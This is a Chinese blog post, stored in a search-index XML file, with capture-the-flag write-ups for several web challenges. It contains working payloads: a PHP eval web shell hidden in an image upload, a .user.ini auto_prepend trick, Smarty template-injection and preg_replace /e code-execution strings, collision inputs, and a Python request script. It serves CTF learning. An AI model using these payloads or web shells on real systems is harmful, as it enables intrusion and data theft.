<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Buuoj WP(Web方向-1)</title>
    <url>/2021/11/22/blog0003-buuoj-web-wp-1/</url>
    <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
<p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p>
<span id="more"></span>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开calc.php，发现PHP代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>首先发送一个phpinfo()测试，发现返送回来一个403，基本可以判定部署的WAF/IDS会对url里的参数进行检查，对于含有英文字符的直接屏蔽，只能发送数字和运算符号。</p>
<h3 id="PHP请求参数解析漏洞"><a href="#PHP请求参数解析漏洞" class="headerlink" title="PHP请求参数解析漏洞"></a>PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span></span><br><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span></span><br></pre></td></tr></table></figure>
<p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p>
<p>因此我们利用这招绕过了url上的字母检查，达到PHP内部实现RCE</p>
<p>同样的例子还有：</p>
<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[出现后，后面的点就不会再被转义了。</p>
<p>such as：<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p>
<p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p>
<p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">num=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
<p>成功拿到flag。</p>
<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查。（主要利用HTTP的分块传输chunked知识点）</p>
<p>参考资料:</p>
<p><a href="https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/">https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/</a></p>
<p>HTTP请求走私：</p>
<p><a href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html">https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html</a></p>
<p><a href="https://xz.aliyun.com/t/6654#toc-1%5D">https://xz.aliyun.com/t/6654#toc-1%5D</a></p>
<h2 id="2、Ez-ByPass——MD5强碰撞"><a href="#2、Ez-ByPass——MD5强碰撞" class="headerlink" title="2、Ez_ByPass——MD5强碰撞"></a>2、Ez_ByPass——MD5强碰撞</h2><p>这道题就是PHP特性题，当然MD5强碰撞还是第一次遇见，在这里记录一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要的难点就在于MD5强碰撞，不过已经有现成的脚本（fastcoll_v1.0.0.5.exe 可以在GitHub上找到）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
<p>这里附上现成的结果，下次可以直接撸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D27%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BB%D3%19%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DDu%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2%F6%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%05S%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0o%DB%A1%2C%A7</span><br><span class="line"></span><br><span class="line">gg=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D2%B7%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BBS%1A%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DD%F5%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2v%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%85R%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0%EF%DB%A1%2C%A</span><br></pre></td></tr></table></figure>
<p>这里再附一个Python代码，某次又碰到了，但还是没秒出，生气！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># md5</span></span><br><span class="line"><span class="comment"># array1 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span></span><br><span class="line"><span class="comment"># array2 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha1</span></span><br><span class="line">array1 = <span class="string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;</span></span><br><span class="line">array2 = <span class="string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1.14.71.254:28577/Level___3.php&quot;</span></span><br><span class="line">url_1 = <span class="string">&quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;array1=&quot;</span>+array1+<span class="string">&quot;&amp;array2=&quot;</span>+array2</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url,proxies=proxies,data=cmd,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>第二个绕过点就很简单了，直接利用PHP字符串隐式转数字的特点：<code>password = 1234567a</code>就可以过了。</p>
<h2 id="3、SUCTF-Checkin-user-ini-文件上传"><a href="#3、SUCTF-Checkin-user-ini-文件上传" class="headerlink" title="3、SUCTF-Checkin(.user.ini 文件上传)"></a>3、SUCTF-Checkin(.user.ini 文件上传)</h2><p>打开题目界面，发现这样的场景。</p>
<p>直接上传正常的文件，我们可以发现可以直接访问到一个upload的目录，在该目录下存在我们上传的文件和一个index.php。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_1.png" alt=""></p>
<p>首先上传一个简单的测试，基本可以猜测后端会检查文件类型，上传PHP类型等直接解析的文件类型的成功概率不大（尝试一下如php3，phtml等常见绕过文件名）。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_2.png" alt=""></p>
<p>试着改回jpg看看有没有办法，这回报错说检测到&lt;?的存在。<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" alt=""></p>
<p>绕过&lt;?，我们可以直接改成这样的html标签语句。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[cmd]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把文件名改成jpg上传之后，发现返回了文件头检测的报错。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_3.png" alt=""></p>
<p>填上GIF的文件头<code>GIF89a</code>尝试骗过去，这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_9.png" alt=""></p>
<p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p>
<p>接下来就是查资料了，直接查到P牛关于.user.ini利用的漏洞。</p>
<p>php解析的时候，同文件夹的ini文件其实是能影响的。</p>
<p>接下来，利用auto_prepend_file和auto_append_file这两个设置，我们将.user.ini传上去，再利用文件包含漏洞，成功获得了后门的权限。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_6.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_7.png" alt=""></p>
<p>参考wp:</p>
<p><a href="https://xz.aliyun.com/t/6091">https://xz.aliyun.com/t/6091</a></p>
<h2 id="4、HCTF-admin"><a href="#4、HCTF-admin" class="headerlink" title="4、HCTF-admin"></a>4、HCTF-admin</h2><h2 id="5、CISCN华东南-Web11（PHP-SSTI）"><a href="#5、CISCN华东南-Web11（PHP-SSTI）" class="headerlink" title="5、CISCN华东南-Web11（PHP SSTI）"></a>5、CISCN华东南-Web11（PHP SSTI）</h2><p>打开页面，是一个IP-API的使用说明</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_11.png" alt=""></p>
<p>可以注意到，这里在右上角获取到了我的IP地址，是一个跟后端交互的点，同时注意到这个网页使用的是smarty，基本可以考虑PHP的模板注入。</p>
<p>首先我们尝试获取相关信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;	<span class="comment">//获取版本信息</span></span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20220405202653660.png" alt="image-20220405202653660"></p>
<p>得到了smarty的版本为3+，在3以上版本的smarty禁止了<code>&#123;php&#125;&#123;/php&#125;</code>标签。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;</span><br></pre></td></tr></table></figure>
<p>不过我们可以使用其他的标签（这里说起来感觉和XSS有点接近，毕竟都是涉及到Web画面渲染）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以拿到我们想要的数据了。</p>
<p>漏洞的成因基本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     </span><br><span class="line">	<span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SSTI的博客链接推荐：</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<h2 id="6、BJDCTF-不过如此"><a href="#6、BJDCTF-不过如此" class="headerlink" title="6、BJDCTF-不过如此"></a>6、BJDCTF-不过如此</h2><p>前面两个点其实非常简单，基本就是<code>php</code>伪协议文件流来读。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://710ac4b6-c046-4853-83bb-d8ea73eb9217.node4.buuoj.cn:81/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
<p>然后读取到文件，解码之后得到如下的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是<code>preg</code>任意代码执行的点了，<code>$re</code>和<code>$str</code>这里我们可以自由控制。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造出如下正则表达式（用phpinfo来简化一下）</span></span><br><span class="line">preg_replace(</span><br><span class="line">  		<span class="string">&#x27;/(\S*)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;<span class="subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>这里具体的匹配原则如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">正则表达式中的“\\1”实际上指的字符串的第一个匹配部分（放在缓冲区中）</span></span><br><span class="line"><span class="comment">&#123;$&#123;phpinfo()&#125;&#125; -&gt; &#123;$&#123;1&#125;&#125; -&gt; strtolower(&quot;\\1&quot;)  -&gt; strtolower(&quot;$&#123;1&#125;&quot;) -&gt; strtolower(null)</span></span><br><span class="line"><span class="comment">在这其中解析的过程，我们会先调用phpinfo(),返回1，于是得到$1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>对于可变变量的理解，附上一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;This is a&quot;</span>;</span><br><span class="line">    <span class="variable">$hello</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$$hello</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">$&#123;$hello&#125; = $a = This is a</span></span><br><span class="line"><span class="comment">*/</span>  </span><br></pre></td></tr></table></figure>
<p>分享一个大佬的博客：</p>
<p><a href="https://www.sqlsec.com/2020/07/preg_replace.html#toc-heading-11">https://www.sqlsec.com/2020/07/preg_replace.html#toc-heading-11</a></p>
